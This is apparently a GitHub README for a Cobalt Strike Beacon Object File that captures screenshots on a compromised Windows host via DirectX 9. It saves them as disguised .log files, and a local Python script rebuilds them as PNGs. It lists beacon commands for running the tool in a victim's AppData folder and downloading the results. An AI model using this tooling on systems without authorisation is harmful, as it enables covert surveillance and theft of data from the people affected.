# DirectX9-Screenshot-BOF

## Overview

Capture Screenshots with DirectX 9

## Notes

- Export screenshots to the **current working directory** as `.log` files
- Output format: `<width>oo<height>.log`
- Reconstruct `.log` files into PNG format locally

### BOF Execution

Ensure you are in the directory you would like the screenshot exported as. 
```
beacon> cd C:\Users\Victim\AppData\
beacon> screenshot-dx
beacon> download <filename>
```

### Example

![Cobalt Strike Example](/img/cobalt-test.png)

![AutoDownload Example](/img/auto-download.png)
## Image Reconstruction

To reconstruct the image with this script, follow these steps:

1. Install the required packages:
    ```bash
    pip3 install Pillow
    ```

2. Run the script with the desired log file path and output file path:
    ```bash
    python3 assemble.py <logfile> output.png
    ```

### Contributers
Big thanks to ma boy Kyle started this and listened to me rage
@kyle41111
